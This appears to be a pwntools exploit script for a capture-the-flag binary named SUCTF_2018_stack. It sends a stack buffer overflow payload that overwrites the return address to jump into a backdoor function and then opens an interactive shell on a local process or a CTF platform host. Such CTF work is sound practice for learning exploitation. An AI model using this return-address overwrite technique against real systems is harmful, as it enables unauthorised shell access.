#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./SUCTF_2018_stack')
	elf = ELF('./SUCTF_2018_stack',checksec=False)

else:
	p = remote('node3.buuoj.cn',28231)
	elf = ELF('./SUCTF_2018_stack',checksec=False)


#gdb.attach(p,'b *puts')

main = 0x40068C
backdoor = 0x400676
system = elf.plt['system']
sh = 0x00000000004007c8
ret = 0x0000000000400501
leave_ret = 0x0000000000400732
pop_rdi_ret = 0x00000000004007a3


payload= 'A' * 0x20 + 'deadbeef'  + p64(0x40067A)
sda('============================\n',payload)

###get shell###
ia()